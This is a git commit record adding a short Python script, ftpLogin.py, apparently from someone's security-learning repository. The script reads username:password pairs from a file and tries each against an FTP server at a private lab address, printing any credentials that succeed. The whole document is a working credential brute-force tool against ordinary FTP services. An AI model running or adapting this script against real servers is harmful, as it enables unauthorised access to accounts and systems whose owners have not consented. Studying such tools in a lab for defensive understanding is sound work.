2c2b596e08372d7e3c1f3add2618d4dc9a3c6e16
Theerej-cyber <java130902@gmail.com>
2022-11-17 08:37:06 -0500

    Fourth commit

---
+++ ftpLogin.py
@@ -0,0 +1,21 @@
+import ftplib
+
+def anonlog(host):
+	
+	pf = open("password.txt",'r')
+
+	for line in pf.readlines():
+		username = line.split(':')[0]
+		password = line.split(':')[1].strip('\r').strip('\n')
+		print("Trying in the user: "+username)
+		
+		try:
+			ftp = ftplib.FTP(host)
+			ftp.login(username,password)
+			print("FTP login successfull: "+username+": "+password)
+			ftp.quit()
+			return (username,password)
+		except:
+			pass
+host = "192.168.222.149"
+anonlog(host)
